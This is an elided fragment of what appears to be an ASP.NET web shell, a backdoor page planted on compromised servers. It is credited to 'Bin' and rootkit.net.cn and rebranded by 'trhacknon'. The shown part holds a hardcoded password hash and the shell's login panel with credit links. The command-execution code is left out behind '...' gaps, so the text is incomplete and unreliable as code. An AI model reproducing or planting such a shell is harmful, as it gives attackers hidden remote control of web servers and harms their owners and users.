...
cn By TRHACKNON
*/
    public string Password = "09054dda72e9ec27fe67588ad9041662"; //trkn
...
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            ...
            <p />
            <strong>Copyright (C) 2008 Bin -> <a href="http://tkndevsec.tk" target="_blank">WwW.trhacknon</a></strong>
            ...
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">Copyright (C) 2008 Bin -> <a href="http://www.rootkit.net.cn" target="_blank">WwW.trhacknon</a> -> <a href="http://www.rootkit.net.cn/index.aspx" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
